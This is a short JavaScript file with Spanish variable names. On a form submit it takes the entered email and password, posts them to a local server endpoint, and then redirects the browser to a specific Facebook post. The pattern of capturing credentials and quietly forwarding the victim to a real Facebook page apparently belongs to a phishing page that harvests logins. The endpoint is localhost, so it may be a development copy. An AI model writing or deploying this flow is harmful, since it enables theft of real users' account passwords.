let añadir = document.querySelector("#añadir");

añadir.addEventListener("submit", function (e) {
  e.preventDefault();


  let correo = document.querySelector("#correo").value;
  let contraseña = document.querySelector("#contraseña").value;

  //fech request
  fetch("http://localhost:4000/user", {
    method: "POST",
    body: JSON.stringify({
        correo: correo,
        contraseña: contraseña
    }),
    headers: {
      "Content-Type": "application/json; charset=UTF-8",
    },
  })
    .then(function (response) {
      return response.json();
    })
    .then(function (data) {
      console.log(data);
      redirigir();
    })
    .catch(function (error){
      console.log('Error', error);
    })
});

function redirigir() {
  window.location.href = "https://www.facebook.com/61557737456942/posts/122144164784257915/?mibextid=WC7FNe&rdid=3R5hnwVUGvestZbo";
}